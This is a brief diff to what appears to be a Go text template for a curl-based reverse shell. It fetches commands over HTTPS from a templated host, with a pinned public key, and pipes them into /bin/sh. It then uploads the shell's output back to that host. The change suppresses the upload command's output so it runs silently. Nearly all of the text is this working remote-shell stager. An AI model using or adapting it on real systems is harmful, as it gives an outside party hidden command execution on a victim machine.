@@ -12,5 +12,5 @@ curl -Nsk --pinnedpubkey "sha256//{{.PubkeyFP}}" https://{{.URL}}
 
 {{template "curl" .}}/i/{{.ID}} </dev/null 2>&0 |
 /bin/sh 2>&1 |
-{{template "curl" .}}/o/{{.ID}} -T-
+{{template "curl" .}}/o/{{.ID}} -T- >/dev/null 2>&1
 {{/* vim: set filetype=gotexttmpl noexpandtab smartindent: */ -}}
